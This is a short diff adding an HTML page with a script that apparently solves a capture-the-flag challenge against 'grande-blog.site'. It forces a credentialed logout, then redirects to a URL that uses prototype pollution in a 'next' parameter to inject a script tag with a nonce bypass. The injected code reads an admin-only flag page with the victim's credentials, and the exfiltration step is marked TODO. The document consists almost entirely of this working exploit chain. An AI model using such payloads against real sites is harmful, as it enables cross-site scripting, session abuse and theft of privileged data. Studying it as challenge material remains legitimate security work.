@@ -1,0 +1,15 @@
+<script>
+async function run() {
+  await fetch('https://grande-blog.site/logout',{credentials:'include'}).catch(()=>{})
+
+  let payload = `
+console.log('xsss');
+fetch('/admin/my_favorite_flag',{credentials:'include'}).then(x=>x.text()).then(x=>console.log('TODO EXFIL',x));
+  `;
+
+  const BASE_URL = 'https://grande-blog.site';
+  let url = BASE_URL + `/next?next[__proto__][]&next[length]=2&next[]=${BASE_URL}&next[]=${encodeURIComponent(`"><s`+`cript nonce="undefined">${payload}</s`+`cript>`)}`;
+  location.href = url;
+}
+run();
+</script>
